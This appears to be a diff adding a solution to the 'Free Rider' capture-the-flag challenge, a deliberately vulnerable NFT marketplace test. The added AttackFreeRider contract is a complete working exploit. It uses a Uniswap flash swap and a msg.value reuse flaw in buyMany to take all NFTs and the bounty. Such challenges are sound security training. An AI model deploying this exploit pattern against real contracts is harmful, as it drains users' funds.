@@ -123,7 +123,8 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        AttackFreeRider attackFreeRider = new AttackFreeRider(uniswapPair, marketplace, recoveryManager, weth);
+        attackFreeRider.attack();
     }
 
     /**
@@ -145,4 +146,59 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+contract AttackFreeRider {
+    IUniswapV2Pair pair;
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    WETH weth;
+
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        WETH _weth
+    ) {
+        pair = _pair;
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        weth = _weth;
+    }
+
+    function attack() external {
+        if (pair.token0() == address(weth)) {
+            pair.swap(NFT_PRICE, 0, address(this), "0x");
+        } else {
+            pair.swap(0, NFT_PRICE, address(this), "0x");
+        }
+    }
+
+    function uniswapV2Call(address, uint256, uint256, bytes memory) external {
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        weth.withdraw(NFT_PRICE);
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(tx.origin));
+        }
+
+        uint256 returnAmount = NFT_PRICE + NFT_PRICE * 3 / 1000 + 10e16;
+        weth.deposit{value: returnAmount}();
+        weth.transfer(msg.sender, returnAmount);
+
+        (bool s,) = tx.origin.call{value: address(this).balance}("");
+        require(s);
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
